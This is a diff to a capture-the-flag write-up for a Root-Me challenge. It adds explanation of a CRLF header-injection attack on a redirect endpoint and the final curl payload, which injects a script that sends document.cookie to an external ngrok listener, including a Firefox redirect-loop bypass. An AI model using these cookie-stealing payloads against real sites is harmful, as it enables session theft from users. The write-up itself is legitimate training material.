@@ -55,7 +55,12 @@ router.get('/api/redirect', (req, res) => {
 ````bash
 curl -G "http://dyn-01.xmas.root-me.org:24694/api/report" --data-urlencode "url=http://127.0.0.1:3000/api/redirect?url=%0D%0AContent-Type%3A%20text%2Fhtml%20%0A%0A%3Chtml%3E%3Cscript%3Efetch%28%27http%3A%2F%2F7.tcp.eu.ngrok.io%3A18440%2F%27%29%3C%2Fscript%3E%3C%2Fhtml%3E%0A%0A"
 ````
-Actually, tje \r\n chars triggered a 302 page meaning ça the page had benn found 
+Actually, \r\n chars triggered a 302 page meaning that page had been found on the server and well overwritten. At this point it was satisfying insofar as the payload applied to the target domain: 
+
+<p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>
+
+<p align="justify"> Nonetheless when testing the payload on firefox, it only triggered a redirect loop leading abortion by firefox itself after too many redirections. After searching for known bypass I found (thanks Vic_V2 !) this documenation <a href="https://www.gremwell.com/firefox-xss-302">doc</a>, in which the loop redirect issue had been solved using websocket in Location headers. Hence, I adjusted my payload but faced a last obstacle , the CORS headers. To solve this problem, I added the following parameters for fetching my external server to get around CORS restrictions: </p>
+
 ````javascript
 fetch('http://7.tcp.eu.ngrok.io:18440/',
         {
@@ -66,11 +71,14 @@ fetch('http://7.tcp.eu.ngrok.io:18440/',
 )
 ````
 
+Finally I came up with the final paylaod below :
+
 ````bash
 curl -G "http://dyn-01.xmas.root-me.org:24694/api/report" --data-urlencode "url=http://127.0.0.1:3000/api/redirect?url=ws://google.com%0D%0AContent-Type%3A%20text%2Fhtml%20%0D%0A%0D%0A%3Chtml%3E%3Cscript%3Efetch%28%27http%3A%2F%2F7.tcp.eu.ngrok.io%3A18440%2F%27%2C%20%7Bmethode%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20document.cookie%7D%29%3C%2Fscript%3E%3C%2Fhtml%3E%0A%0A"
 ````
+After opening a listening port, I finally received the flag : 
 
 <p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>
 
-Flag : _RM{Damnn_Chrome_And_Firefox_4re_S0_different}_ , thanks _Elweth_ for this challenge !
+Flag : _RM{Damnn_Chrome_And_Firefox_4re_S0_different}_ , thanks _Elweth_ for this challenge and a massive thanks to _Vic_V2_ for helping me out troubleshooting !
 
